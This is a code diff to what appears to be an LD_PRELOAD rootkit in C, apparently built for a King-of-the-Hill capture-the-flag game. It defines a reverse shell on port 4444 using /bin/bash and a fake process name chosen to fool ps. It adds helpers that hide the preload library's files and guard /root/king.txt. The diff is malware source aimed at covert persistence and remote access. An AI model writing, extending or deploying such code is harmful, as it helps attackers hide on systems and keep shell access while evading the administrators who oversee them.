@@ -34,6 +34,7 @@
 #define PORT 4444 //listening port for reverse shell
 #define SHELL "/bin/bash" //shell for reverse shell
 #define PROCESS_NAME "/etc/systemd-resolved" //name that appears as process name to fool `ps` and similiar tools
+#define HIDDEN_GID 5005
 #define DEBUG 0 //set to 1 for logging
 
 //don't change these
@@ -51,6 +52,8 @@ char *dirfd_pathname_to_path(int, const char *);
 int set_attributes(const char *, int);
 int king();
 void revshell();
+int is_hidden(char *);
+int is_protected(char *);
 
 
 //hooks declarations
@@ -274,6 +277,20 @@ void revshell() {
     }
 
     return; //return the function in the parent process
+}
+
+
+int is_protected(char *pathname) {
+    if (strcmp(pathname, "/root/king.txt") == 0) {
+        king();
+        return 1;
+    }
+    return 0;
+}
+
+
+int is_hidden(char *pathname) {
+    return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0; //return 1 if there is a match
 }
 
 
